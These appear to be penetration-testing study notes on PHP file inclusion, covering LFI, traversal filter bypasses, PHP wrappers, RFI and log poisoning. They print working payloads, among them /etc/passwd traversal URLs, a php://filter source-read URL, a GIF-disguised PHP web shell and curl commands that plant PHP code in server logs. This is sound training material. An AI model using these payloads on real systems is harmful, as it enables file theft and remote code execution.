
# File Inclusion

<p align="justify">HTTP parameters specify what is shown on the web page, which allows for building dynamic web pages, reduces the script's overall size, and simplifies the code. In such cases, parameters are used to specify which resource is shown on the page. If such functionalities are not securely coded, an attacker may manipulate these parameters to display the content of any local file on the hosting server, leading to a Local File Inclusion (LFI) vulnerability.</p>

### Local File Inclusion (LFI)

<p align="justify">Local File Inclusion (LFI) allows an attacker to include files on a server through the web browser. This vulnerability exists when a web application includes a file without correctly sanitizing the input, allowing and attacker to manipulate the input and inject path traversal characters, and include other files from the web server.</p>

<p align="justify">LFI vulnerabilities can lead to source code disclosure, sensitive data exposure, and even remote code execution under certain conditions. Leaking source code may allow attackers to test the code for other vulnerabilities, which may reveal previously unknown vulnerabilities. Furthermore, leaking sensitive data may enable attackers to enumerate the remote server for other weaknesses or even leak credentials and keys that may allow them to access the remote server directly. Under specific conditions, LFI may also allow attackers to execute code on the remote server, which may compromise the entire back-end server and any other servers connected to it.</p>

#### Examples of Vulnerable Code
<p align="justify">Let's look at some examples of code vulnerable to File Inclusion to understand how such vulnerabilities occur.</p>

PHP LFI vulnerable code

```
<?php
$file = $_GET['file']; // Vulnerable input

// Include the file based on user input
include($file . '.php');
?>
```
<p align="justify">In this code, the $file variable is directly taken from the user input via the $_GET superglobal without any validation or sanitization. An attacker can exploit this vulnerability by manipulating the file parameter in the URL to include arbitrary files from the server's filesystem.</p>


### Path traversal

<p align="justify">Path traversal is also known as directory traversal. These vulnerabilities enable an attacker to read arbitrary files on the server that is running an application. This might include:</p>

* Application code and data.
* Credentials for back-end systems.
*Sensitive operating system files.

<p align="justify">In some cases, an attacker might be able to write to arbitrary files on the server, allowing them to modify application data or behavior, and ultimately take full control of the server.</p>

### Basic Bypasses

#### Non-Recursive Path Traversal Filters

``` $language = str_replace('../', '', $_GET['language']); ```

``` http://example.com/index.php?language=../../../etc/passwd ```

<p align="justify">One of the most basic filters against LFI is a search and replace filter, which it simply deletes substrings of (../) to avoid path traversals. 
../ substrings were removed, which resulted in a final path being ./languages/etc/passwd. </p>

<p align="justify">However, this filter is very insecure, as it is not recursively removing the ../ substring, as it runs a single time on the input string and does not apply the filter on the output string. For example, if we use ....// as our payload, then the filter would remove ../ and the output string would be ../, which means we may still perform path traversal. Let's try applying this logic to include /etc/passwd again:</p>

``` http://example.com/index.php?language=....//....//....//etc/passwd ```

<p align="justify">The ....// substring is not the only bypass we can use, as we may use ..././ or ....\/ and several other recursive LFI payloads. Furthermore, in some cases, escaping the forward slash character may also work to avoid path traversal filters (e.g. ....\/), or adding extra forward slashes (e.g. ....////)</p>

### Encoding

<p align="justify">Some web filters may prevent input filters that include certain LFI-related characters, like a dot . or a slash / used for path traversals. However, some of these filters may be bypassed by URL encoding our input, such that it would no longer include these bad characters, but would still be decoded back to our path traversal string once it reaches the vulnerable function</p>

<p align="justify">If the target web application did not allow. and / in our input, we can URL encode ../ into %2e%2e%2f, which may bypass the filter.</p>

<p align="justify">Furthermore, we may also use the Burp Decoder to encode the encoded string once again to have a double-encoded string, which may also bypass other types of filters.</p>

### Appended Extension

<p align="justify">As discussed in the previous section, some web applications append an extension to our input string (e.g. .php), to ensure that the file we include is in the expected extension. With modern versions of PHP, we may not be able to bypass this and will be restricted to only reading files in that extension</p>

### Path Truncation

<p align="justify">In earlier versions of PHP, defined strings have a maximum length of 4096 characters, likely due to the limitation of 32-bit systems. If a longer string is passed, it will simply be truncated, and any characters after the maximum length will be ignored. Furthermore, PHP also used to remove trailing slashes and single dots in path names, so if we call (/etc/passwd/.) then the /. would also be truncated, and PHP would call (/etc/passwd). PHP, and Linux systems in general, also disregard multiple slashes in the path (e.g. ////etc/passwd is the same as /etc/passwd). Similarly, a current directory shortcut (.) in the middle of the path would also be disregarded (e.g. /etc/./passwd).</p>


<p align="justify">If we combine both of these PHP limitations together, we can create very long strings that evaluate to a correct path. Whenever we reach the 4096 character limitation, the appended extension (.php) would be truncated, and we would have a path without an appended extension. Finally, it is also important to note that we would also need to start the path with a non-existing directory for this technique to work.</p>


An example of such a payload would be the following:

```
?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times]
```
Of course, we don't have to manually type ./ 2048 times (a total of 4096 characters), but we can automate the creation of this string with the following command:

```
[!bash!]$ echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
```
non_existing_directory ``` /../../../etc/passwd/./././<SNIP>././././ ```

<p align="justify">We may also increase the count of ../, as adding more would still land us in the root directory, as explained in the previous section. However, if we use this method, we should calculate the full length of the string to ensure only .php gets truncated and not our requested file at the end of the string (/etc/passwd). This is why it would be easier to use the first method.</p>

### Null Bytes

<p align="justify">PHP versions before 5.5 were vulnerable to null byte injection, which means that adding a null byte (%00) at the end of the string would terminate the string and not consider anything after it. This is due to how strings are stored in low-level memory, where strings in memory must use a null byte to indicate the end of the string, as seen in Assembly, C, or C++ languages.</p>

<p align="justify">To exploit this vulnerability, we can end our payload with a null byte (e.g. /etc/passwd%00), such that the final path passed to include() would be (/etc/passwd%00.php). This way, even though .php is appended to our string, anything after the null byte would be truncated, and so the path used would actually be /etc/passwd, leading us to bypass the appended extension.</p>

### PHP Filters

<p align="justify">Many popular web applications are developed in PHP, along with various custom web applications built with different PHP frameworks, like Laravel or Symfony. If we identify an LFI vulnerability in PHP web applications, then we can utilize different PHP Wrappers to be able to extend our LFI exploitation, and even potentially reach remote code execution.</p>

<p align="justify">PHP Wrappers allow us to access different I/O streams at the application level, like standard input/output, file descriptors, and memory streams. This has a lot of uses for PHP developers. Still, as web penetration testers, we can utilize these wrappers to extend our exploitation attacks and be able to read PHP source code files or even execute system commands. This is not only beneficial with LFI attacks but also with other web attacks like XXE, as covered in the Web Attacks module.</p>

<p align="justify">In this section, we will see how basic PHP filters are used to read PHP source code, and in the next section, we will see how different PHP wrappers can help us gain remote code execution through LFI vulnerabilities.</p>

#### Input Filters

<p align="justify">PHP Filters are a type of PHP wrappers, where we can pass different types of input and have it filtered by the filter we specify. To use PHP wrapper streams, we can use the php:// scheme in our string, and we can access the PHP filter wrapper with ``` php://filter/ ```.</p>

<p align="justify">The filter wrapper has several parameters, but the main ones we require for our attack are resource and read. The resource parameter is required for filter wrappers, and with it we can specify the stream we would like to apply the filter on (e.g. a local file), while the read parameter can apply different filters on the input resource, so we can use it to specify which filter we want to apply on our resource.</p>

<p align="justify">There are four different types of filters available for use, which are String Filters, Conversion Filters, Compression Filters, and Encryption Filters. You can read more about each filter on their respective link, but the filter that is useful for LFI attacks is the convert.base64-encode filter, under Conversion Filters.

#### Fuzzing for PHP Files

<p align="justify">The first step would be to fuzz for different available PHP pages with a tool like ffuf or gobuster, as covered in the Attacking Web Applications with Ffuf module:

 ##### PHP Filters
 
```` ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php ````


<p align="justify">Tip: Unlike normal web application usage, we are not restricted to pages with HTTP response code 200, as we have local file inclusion access, so we should be scanning for all codes, including `301`, `302` and `403` pages, and we should be able to read their source code as well.</p>

<p align="justify">Even after reading the sources of any identified files, we can scan them for other referenced PHP files, and then read those as well, until we are able to capture most of the web application's source or have an accurate image of what it does. It is also possible to start by reading index.php and scanning it for more references and so on, but fuzzing for PHP files may reveal some files that may not otherwise be found that way.</p>


### PHP Wrappers

<p align="justify">php wrapper can be said to a kind of code library that is available to interact with the external services, APIs or Functionalities, making it easier for php developers to work with them.</p>



There are a lot of meta wrappers available in php.

*file://: This is the default stream wrapper for local files and directories.
*http://: Used for making HTTP requests and retrieving data from remote web servers.
*https://: Similar to the “http://” wrapper, but for secure (HTTPS) connections.
*ftp://: For accessing files on FTP servers.
*data://: This allows you to embed data directly within the URI, often used for embedding small data sets or resources.
*zip://: Used to access files within ZIP archives.
*phar://: Allows access to files within Phar archives (PHP Archives).
*glob://: Provides access to files using a pattern or glob.
*php://: This wrapper is used for various PHP-specific streams, such as

php://stdin, php://stdout, and php://memory.

<p align="justify">PHP:// is a wrapper for Accessing various I/O streams. We will use php://filter — it is a kind of meta-wrapper designed to permit the application of filters to a stream at the time of opening. There are multiple parameters to this wrapper, we will use convert.base64-encode/resource= — This will convert the given file into base64 encoding and print it on screen. But we have to provide the resource that we want to read like a file name index.php.</p>

#### PHP wrappers to exploit Local File inclusion

http://mafialive.thm/test.php?view=php://filter/read=convert.base64-encode/resource=/var/www/html/development_testing/test.php.

The filter is a meta php wrapper, and it will convert the PHP code as base64 encoding and print the results.


### Remote File Inclusion (RFI)

<p align="justify">So far in this module, we have been mainly focusing on Local File Inclusion (LFI). However, in some cases, we may also be able to include remote files "Remote File Inclusion (RFI)", if the vulnerable function allows the inclusion of remote URLs. This allows two main benefits:</p>

*Enumerating local-only ports and web applications (i.e. SSRF)
*Gaining remote code execution by including a malicious script that we host

<p align="justify">In this section, we will cover how to gain remote code execution through RFI vulnerabilities. The Server-side Attacks module covers various SSRF techniques, which may also be used with RFI vulnerabilities.</p>

### LFI and File Uploads

<p align="justify">The File Upload Attacks module covers different techniques on how to exploit file upload forms and functionalities. However, for the attack we are going to discuss in this section, we do not require the file upload form to be vulnerable, but merely allow us to upload files. If the vulnerable function has code Execute capabilities, then the code within the file we upload will get executed if we include it, regardless of the file extension or file type. For example, we can upload an image file (e.g. image.jpg), and store a PHP web shell code within it 'instead of image data', and if we include it through the LFI vulnerability, the PHP code will get executed and we will have remote code execution.</p>

#### Crafting Malicious Image
<p align="justify">Our first step is to create a malicious image containing a PHP web shell code that still looks and works as an image. So, we will use an allowed image extension in our file name (e.g. shell.gif), and should also include the image magic bytes at the beginning of the file content (e.g. GIF8), just in case the upload form checks for both the extension and content type as well. We can do so as follows:</p>

```` echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif ````

<p align="justify">This file on its own is completely harmless and would not affect normal web applications in the slightest. However, if we combine it with an LFI vulnerability, then we may be able to reach remote code execution.</p>

## Log Poisoning
<p align="justify">A server log is a text file that contains all the activities that have been performed while communicating with the web server like files that were accessed, status codes, user-agent, location, IP, etc.</p>

<p align="justify">Log poisoning or Log injection is a technique that allows the attacker to tamper with the log file contents like inserting the malicious code to the server logs to execute commands remotely or to get a reverse shell. It will work only when the application is already vulnerable to LFI.</p>

<p align="justify">The PHP code includes file index.html from the include statement without proper input validation, so the inclusion of a malformed file would be evaluated. If we can control the contents of a file available on the vulnerable web application, we could insert PHP code and load the file over the LFI vulnerability to execute our code.</p>

The contents that we can control are the logs that we are sending to the server.

<p align="justify">In our case, the server is Nginx so the default path for logs is /var/log/nginx/access.log and it will differ according to different servers. Encoding and sending the below string gives us the logs of the server.</p>

Note: Change the size to 34 for the particular string </p>

```` O:9:"PageModel":1:{s:4:"file";s:25:"/var/log/nginx/access.log";} ````

![Alt text](https://github.com/anuvind2973/Web-Application-Security/blob/main/File%20Inclusion/Log%20Poisoning_RCE.webp)


### Remote Code Execution

As the User-Agent header is being logged, we are going to change its value to a malicious PHP code and send it to the server.

RCE vulnerability allows an attacker to execute commands remotely on the victim system.

Below PHP function system() accepts a command as a parameter and displays its result as output.

```` <?php system('ls /'); ?> ````

![Alt text](https://github.com/anuvind2973/Web-Application-Security/blob/main/File%20Inclusion/Images/Log%20Poisoning_RCE.webp)

````
Command: curl -i -v {URL} -A "<?php system('ls /'); ?>"
-i include response
-v verbose 
-A To provide the value of User-Agent

````
After the request is sent, the PHP code has been logged into the system and should be executed once we visit the access.log file.



```` Command:  curl -i -v {URL} -b "PHPSESSID=Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoyNToiL3Zhci9sb2cvbmdpbngvYWNjZXNzLmxvZyI7fQ==" ````

![Alt text](https://github.com/anuvind2973/Web-Application-Security/blob/main/File%20Inclusion/Images/Log%20Poisoning_RCE_.webp)

https://academy.hackthebox.com/module/23/section/1492
https://academy.hackthebox.com/module/23/section/1491
https://www.google.com/search?q=javascript+lfi+vulnerability+code&sca_esv=125395e02bc1fefe&sca_upv=1&rlz=1C1VDKB_enIN1066IN1066&sxsrf=ACQVn09LDgIbAe0fetF7wuSZW9ELXgwbVQ%3A1713508799071&ei=vxEiZsHyA__hseMPmZq_wAc&ved=0ahUKEwiBzqba1c2FAxX_cGwGHRnND3gQ4dUDCBE&oq=javascript+lfi+vulnerability+code&gs_lp=Egxnd3Mtd2l6LXNlcnAiIWphdmFzY3JpcHQgbGZpIHZ1bG5lcmFiaWxpdHkgY29kZTIIEAAYgAQYogQyCBAAGIAEGKIEMggQABiABBiiBEjnCVAAWABwAHgBkAEAmAGIAaABiAGqAQMwLjG4AQzIAQD4AQL4AQGYAgGgAowBmAMAkgcDMC4xoAefAg&sclient=gws-wiz-serp
https://www.vaadata.com/blog/exploiting-an-lfi-local-file-inclusion-vulnerability-and-security-tips/
https://skf.gitbook.io/asvs-write-ups/local-file-inclusion-1-lfi-1/lfi-1
https://github.com/Security-Knowledge-Framework/Labs
https://skf.gitbook.io/asvs-write-ups
https://owasp.org/www-community/attacks/Path_Traversal
https://skf.gitbook.io/asvs-write-ups/local-file-inclusion-3-lfi-3/lfi-3-1
https://gupta-bless.medium.com/exploiting-local-file-inclusion-lfi-using-php-wrapper-89904478b225
https://medium.com/@nyomanpradipta120/local-file-inclusion-vulnerability-cfd9e62d12cb
https://www.google.com/search?q=lfi+hack+the+box&rlz=1C1VDKB_enIN1066IN1066&oq=LFI+hackthe+&gs_lcrp=EgZjaHJvbWUqCAgBEAAYDRgeMgYIABBFGDkyCAgBEAAYDRgeMg0IAhAAGIYDGIAEGIoFMg0IAxAAGIYDGIAEGIoF0gEINTEzOGowajeoAgCwAgA&sourceid=chrome&ie=UTF-8
https://medium.com/hackthebox-writeups-by-jsinix/hack-the-box-beep-1293837d2293
https://medium.com/@harry.hphu/hackthebox-file-inclusion-local-file-inclusion-lfi-1a8a83878153
https://www.google.com/search?q=Second+Order+Attack+LFI&rlz=1C1VDKB_enIN1066IN1066&oq=Second+Order+Attack+LFI&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIHCAEQIRigATIHCAIQIRigAdIBCDIwNDBqMGo3qAIAsAIA&sourceid=chrome&ie=UTF-8
https://www.google.com/search?q=Approved+Paths+LFI&sca_esv=09379ecd0b6efd91&sca_upv=1&rlz=1C1VDKB_enIN1066IN1066&sxsrf=ACQVn0_bv6nzr3RhYTpBR3rV7ocsH7wXjQ%3A1713551020383&ei=rLYiZtaFF726vr0P96-XoAs&ved=0ahUKEwjWi__-8s6FAxU9na8BHffXBbQQ4dUDCBE&uact=5&oq=Approved+Paths+LFI&gs_lp=Egxnd3Mtd2l6LXNlcnAiEkFwcHJvdmVkIFBhdGhzIExGSTIFECEYoAEyBRAhGKABSLoTUHNYrhBwAXgBkAEAmAG0AaABmAWqAQMwLjS4AQPIAQD4AQGYAgWgAqQFwgIKEAAYsAMY1gQYR8ICBhAAGBYYHsICCxAAGIAEGIYDGIoFwgIHECEYoAEYCpgDAIgGAZAGBJIHAzEuNKAHyws&sclient=gws-wiz-serp
https://book.hacktricks.xyz/pentesting-web/file-inclusion
https://0xffsec.com/handbook/web-applications/file-inclusion-and-path-traversal/
https://chromewebstore.google.com/detail/copy-all-urls/djdmadneanknadilpjiknlnanaolmbfk


https://www.google.com/search?q=Local+File+Inclusion+(LFI)+blogs&rlz=1C1VDKB_enIN1066IN1066&oq=Local+File+Inclusion+(LFI)+blogs&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIJCAEQIRgKGKABMgkIAhAhGAoYoAHSAQg0ODUxajBqN6gCALACAA&sourceid=chrome&ie=UTF-8#ip=1
https://www.acunetix.com/blog/articles/local-file-inclusion-lfi/#:~:text=Frequently%20asked%20questions-,What%20is%20local%20file%20inclusion%20(LFI)%3F,this%20website%20or%20web%20application.
https://brightsec.com/blog/local-file-inclusion-lfi/
https://www.vaadata.com/blog/exploiting-an-lfi-local-file-inclusion-vulnerability-and-security-tips/
https://www.aptive.co.uk/blog/local-file-inclusion-lfi-testing/
https://snapsec.co/blog/LFI/
https://medium.com/@tanmay_deshpande/local-file-inclusion-lfi-attack-46485f294aef
https://www.hackingarticles.in/comprehensive-guide-to-local-file-inclusion/
https://sushant747.gitbooks.io/total-oscp-guide/content/local_file_inclusion.html
https://touhidshaikh.com/blog/2023/01/local-file-inclusionlfi-explained/
https://systemweakness.com/local-file-inclusion-lfi-a-beginners-guide-5629bbcbcffb
https://medium.com/@anekantsinghai/best-approach-to-lfi-40c91f1dfc54
https://tcm-sec.com/local-file-inclusion-a-practical-guide/
https://hacklido.com/blog/190-local-file-inclusion-lfi-cheatsheet
https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-1/
https://www.linkedin.com/pulse/file-inclusion-vulnerabilities-dinesh-reddy-challa
https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md
https://notchxor.github.io/oscp-notes/2-web/LFI-RFI/
https://notes.defendergb.org/web-sec/vuln/lfi-rfi
https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt
https://book.hacktricks.xyz/pentesting-web/file-inclusion
https://hackerone.com/reports/39428
https://github.com/rezaJOY/Local-File-Inclusion-Payloads
https://thehackernews.com/search/label/Local%20file%20inclusion
https://blog.cyscomvit.com/2021/07/local-file-inclusion.html










